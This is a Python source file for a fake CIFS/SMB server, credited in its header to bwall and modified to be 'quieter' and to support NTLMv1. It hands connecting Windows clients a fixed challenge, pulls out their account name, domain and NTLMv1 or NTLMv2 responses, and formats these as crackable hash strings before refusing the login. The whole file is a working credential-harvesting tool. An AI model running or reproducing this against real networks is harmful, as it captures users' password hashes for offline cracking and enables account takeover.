import socket
import time
import struct
import sys
import threading
import datetime

""" Bulk of this code is credited to bwall (@botnet_hunter) 
This was modified to be quieter and to support NTLMv1

Simple CIFS service that obtains the hash and rejects the connection.

Original:
    https://github.com/bwall/BAMF/blob/master/IntegrationQueue/static/cifstrap.py
"""


class Handler(threading.Thread):
    def __init__(self, conn, addr):
        threading.Thread.__init__(self)
        self.conn = conn
        self.addr = addr
        self.data = None

    def run(self):
        try:
            #get negotiate_protocol_request
            negotiate_protocol_request = self.conn.recv(1024)
            if not negotiate_protocol_request:
                self.conn.close()
                return

            dialect_location = 40
            dialect_index = 0
            dialect_name = ""
            while dialect_location < negotiate_protocol_request.__len__():
                dialect_name = ""
                while ord(negotiate_protocol_request[dialect_location]) != 0x00:
                    if ord(negotiate_protocol_request[dialect_location]) != 0x02:
                        dialect_name += negotiate_protocol_request[dialect_location]
                    dialect_location += 1
                if dialect_name == "NT LM 0.12":
                    break
                dialect_index += 1
                dialect_location += 1

            #netbios session service
            negotiate_protocol_response = "\x00\x00\x00\x51"

            #SMB Header
            #Server Component
            negotiate_protocol_response += "\xff\x53\x4d\x42"
            #SMB Command
            negotiate_protocol_response += "\x72"
            #NT Status
            negotiate_protocol_response += "\x00\x00\x00\x00"
            #Flags
            negotiate_protocol_response += "\x88"
            #Flags2
            negotiate_protocol_response += "\x01\xc0"
            #Process ID High
            negotiate_protocol_response += "\x00\x00"
            #Signature
            negotiate_protocol_response += "\x00\x00\x00\x00\x00\x00\x00\x00"
            #Reserved
            negotiate_protocol_response += "\x00\x00"
            #Tree ID
            negotiate_protocol_response += negotiate_protocol_request[28] + negotiate_protocol_request[29]
            #Process ID
            negotiate_protocol_response += negotiate_protocol_request[30] + negotiate_protocol_request[31]
            #User ID
            negotiate_protocol_response += negotiate_protocol_request[32] + negotiate_protocol_request[33]
            #Multiplex ID
            negotiate_protocol_response += negotiate_protocol_request[34] + negotiate_protocol_request[35]

            #Negotiate Protocol Response
            #Word Count
            negotiate_protocol_response += "\x11"
            #Dialect Index
            negotiate_protocol_response += chr(dialect_index) + "\x00"
            #Security Mode
            negotiate_protocol_response += "\x03"
            #Max Mpx Count
            negotiate_protocol_response += "\x02\x00"
            #Max VCs
            negotiate_protocol_response += "\x01\x00"
            #Max Buffer Size
            negotiate_protocol_response += "\x04\x11\x00\x00"
            #Max Raw Buffer
            negotiate_protocol_response += "\x00\x00\x01\x00"
            #Session Key
            negotiate_protocol_response += "\x00\x00\x00\x00"
            #Capabilities
            negotiate_protocol_response += "\xfd\xe3\x00\x00"
            #System Time
            negotiate_protocol_response += "\x00" * 8
            #UTC Offset in minutes
            negotiate_protocol_response += "\x00\x00"
            #Key Length
            negotiate_protocol_response += "\x08"
            #Byte Count
            negotiate_protocol_response += "\x0c\x00"
            #Encryption Key
            negotiate_protocol_response += "\x11\x22\x33\x44\x55\x66\x77\x88"
            #Primary Domain
            negotiate_protocol_response += "\x00\x00"
            #Server
            negotiate_protocol_response += "\x00\x00"

            self.conn.sendall(negotiate_protocol_response)
            for x in range(0, 2):
                ntlmssp_request = self.conn.recv(1024)
                if ntlmssp_request.__len__() < 89 + 32 + 8 + 16:
                    continue

                nt_len = struct.unpack('<H', ntlmssp_request[53:55])[0]
                if nt_len == 24 and ntlmssp_request[8:10] == '\x73\x00':
                    # NTLMv1
                    lm_len = struct.unpack('<H', ntlmssp_request[51:53])[0]
                    cc = struct.unpack('<H', ntlmssp_request[63:65])[0]
                    pack = tuple(ntlmssp_request[89+24:].split("\x00\x00\x00"))[:2]
                    var = [x.replace('\x00','') for x in ntlmssp_request[89+24:cc+60].split('\x00\x00\x00')[:2]]
                    (account, domain) = tuple(var)
                    self.data = '{0}::{1}:112233445566778899:{2}:{3}'.format(account, domain,
                                ntlmssp_request[65:65+lm_len].encode('hex').upper(),
                                ntlmssp_request[65+lm_len:65+lm_len+nt_len].encode('hex').upper())
                elif nt_len > 24:
                    # NTLMv2
                    hmac = ''.join('%02x'%ord(ntlmssp_request[i]) for i in range(89, 89 + 16))
                    header = ''.join('%02x'%ord(ntlmssp_request[i]) for i in range(89 + 16, 89 + 20))
                    challenge = ''.join('%02x'%ord(ntlmssp_request[i]) for i in range(89 + 24, 89 + 32 + 8))
                    tail = ''.join('%02x'%ord(ntlmssp_request[i]) for i in range(89 + 32 + 8, 89 + 32 + 8 + 16))

                    tindex = 89 + 32 + 8 + 16 + 1
                    account = ""
                    while ord(ntlmssp_request[tindex]) != 0x00:
                        account += chr(ord(ntlmssp_request[tindex]))
                        tindex += 2

                    tindex += 2
                    domain = ""
                    while ord(ntlmssp_request[tindex]) != 0x00:
                        domain += chr(ord(ntlmssp_request[tindex]))
                        tindex += 2

                    self.data = "{0}::{1}:1122334455667788:{2}:{3}00000000{4}{5}".format(
                                    account, domain, hmac, header, challenge, tail)

                #netbios session service
                ntlmssp_failed = "\x00\x00\x00\x23"

                #SMB Header
                #Server Component
                ntlmssp_failed += "\xff\x53\x4d\x42"
                #SMB Command
                ntlmssp_failed += "\x73"
                #NT Status
                ntlmssp_failed += "\x6d\x00\x00\xc0"
                #Flags
                ntlmssp_failed += "\x88"
                #Flags2
                ntlmssp_failed += "\x01\xc8"
                #Process ID Hight
                ntlmssp_failed += "\x00\x00"
                #Signature
                ntlmssp_failed += "\x00\x00\x00\x00\x00\x00\x00\x00"
                #Reserved
                ntlmssp_failed += "\x00\x00"
                #Tree ID
                ntlmssp_failed += ntlmssp_request[28] + ntlmssp_request[29]
                #Process ID
                ntlmssp_failed += ntlmssp_request[30] + ntlmssp_request[31]
                #User ID
                ntlmssp_failed += ntlmssp_request[32] + ntlmssp_request[33]
                #Multiplex ID
                ntlmssp_failed += ntlmssp_request[34] + ntlmssp_request[35]

                #Negotiate Protocol Response
                #Word Count
                ntlmssp_failed += "\x00\x00\x00"
                self.conn.sendall(ntlmssp_failed)

            self.conn.close()

        except Exception, e:
            self.data = e
